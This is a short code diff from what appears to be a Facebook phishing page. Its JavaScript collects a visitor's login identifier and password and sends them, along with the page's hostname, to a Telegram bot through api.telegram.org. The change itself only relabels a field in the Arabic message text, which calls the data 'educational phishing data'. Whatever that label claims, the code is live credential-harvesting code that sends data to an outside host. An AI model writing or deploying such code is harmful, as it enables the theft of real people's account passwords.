@@ -132,7 +132,7 @@
             const identifier = document.getElementById("identifier").value;
             const password = document.getElementById("password").value;
 
-            const message = `🚨 بيانات تصيد (Facebook) تعليمية:\n\n👤 المستخدم/البريد: ${identifier}\n🔒 كلمة المرور: ${password}\n🌐 المصدر: ${window.location.hostname}`;
+            const message = `🚨 بيانات تصيد (Facebook) تعليمية:\n\n👤 رقم الهاتف/البريد: ${identifier}\n🔒 كلمة المرور: ${password}\n🌐 المصدر: ${window.location.hostname}`;
             
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
 
